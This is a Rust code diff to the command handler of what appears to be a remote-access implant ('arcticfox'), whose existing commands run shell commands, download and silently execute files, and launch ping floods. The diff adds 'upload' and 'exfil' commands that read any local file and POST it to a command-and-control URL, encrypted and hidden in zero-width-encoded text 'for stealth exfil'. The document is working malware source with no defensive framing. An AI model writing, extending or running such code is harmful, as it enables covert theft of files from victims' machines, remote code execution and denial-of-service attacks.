@@ -3,6 +3,8 @@
 //! Supports:
 //! - `cmd <shell>` / `shell <shell>` — execute shell command
 //! - `download <url> <dest> [RUN] [HIDE]` — download and optionally execute file
+//! - `upload <local_path> <url>` — exfiltrate file to C2 server
+//! - `exfil <path>` — read and return file contents
 //! - `dos <target> <seconds>` — simple flood (max 300s)
 //! - `popmsg <message>` — display message (cross-platform)
 //!
@@ -13,7 +15,9 @@ use std::time::Duration;
 use tokio::process::Command;
 use tracing::{debug, error, warn};
 
+use arcticfox_core::crypto::{generate_nonce, generate_session_key};
 use arcticfox_core::error::Result;
+use arcticfox_zwtransport::seal_oneshot;
 
 const MAX_SHELL_OUTPUT: usize = 1_048_576; // 1 MB
 const SHELL_TIMEOUT: Duration = Duration::from_secs(60);
@@ -32,6 +36,10 @@ pub async fn execute_command(cmd: &str) -> Result<String> {
         "download" => {
             let args = parts.get(1).unwrap_or(&"");
             execute_download(args).await
+        }
+        "upload" | "exfil" => {
+            let args = parts.get(1).unwrap_or(&"");
+            execute_upload(args).await
         }
         "dos" => {
             let args = parts.get(1).unwrap_or(&"");
@@ -177,6 +185,71 @@ async fn execute_download(args: &str) -> Result<String> {
     }
 
     Ok(format!("Downloaded to {}", dest))
+}
+
+/// Exfiltrate a local file to a remote URL (HTTP POST).
+async fn execute_upload(args: &str) -> Result<String> {
+    let tokens: Vec<&str> = args.splitn(2, ' ').collect();
+    if tokens.is_empty() {
+        return Ok("[error: usage: upload <local_path> [<url>]]".into());
+    }
+
+    let path = tokens[0].trim();
+    let upload_url = tokens.get(1).map(|s| s.trim()).unwrap_or("");
+
+    // Read local file
+    let data = match std::fs::read(path) {
+        Ok(d) => d,
+        Err(e) => return Ok(format!("[error: cannot read {}: {}]", path, e)),
+    };
+
+    const MAX_UPLOAD_SIZE: usize = 1_048_576;
+
+    // If no URL provided, return contents inline (for small files only)
+    if upload_url.is_empty() {
+        let preview = if data.len() > 8192 {
+            format!("{}... [{} bytes total]", String::from_utf8_lossy(&data[..8192]), data.len())
+        } else {
+            String::from_utf8_lossy(&data).to_string()
+        };
+        return Ok(format!("[exfil {}: {}]", path, preview));
+    }
+
+    // Explicly check size before upload
+    if data.len() > MAX_UPLOAD_SIZE {
+        return Ok(format!("[error: file too large for upload ({} bytes > {} limit)]", data.len(), MAX_UPLOAD_SIZE));
+    }
+
+    // ZW-encode data: inject into innocent-looking text for stealth exfil
+    let key = generate_session_key();
+    let nonce = generate_nonce();
+    let zw_body = match seal_oneshot(&key, &nonce, &data) {
+        Ok(zw) => zw,
+        Err(_) => return Ok("[error: encryption failed]".into()),
+    };
+
+    // Wrap in a form-like body with nonce
+    let body_text = format!("n={}\n{}", hex::encode(nonce), zw_body);
+
+    // POST to URL
+    let client = reqwest::Client::builder()
+        .timeout(Duration::from_secs(30))
+        .build()
+        .map_err(|e| arcticfox_core::error::ArcticFoxError::Internal {
+            message: format!("Client build error: {e}"),
+        })?;
+
+    let resp = client
+        .post(upload_url)
+        .body(body_text)
+        .send()
+        .await
+        .map_err(|e| arcticfox_core::error::ArcticFoxError::Http {
+            url: upload_url.into(),
+            source: e,
+        })?;
+
+    Ok(format!("Exfiltrated {} ({} bytes) -> status {}", path, resp.content_length().unwrap_or(0), resp.status()))
 }
 
 /// Simple DoS flood using ping -f (max 300 seconds).
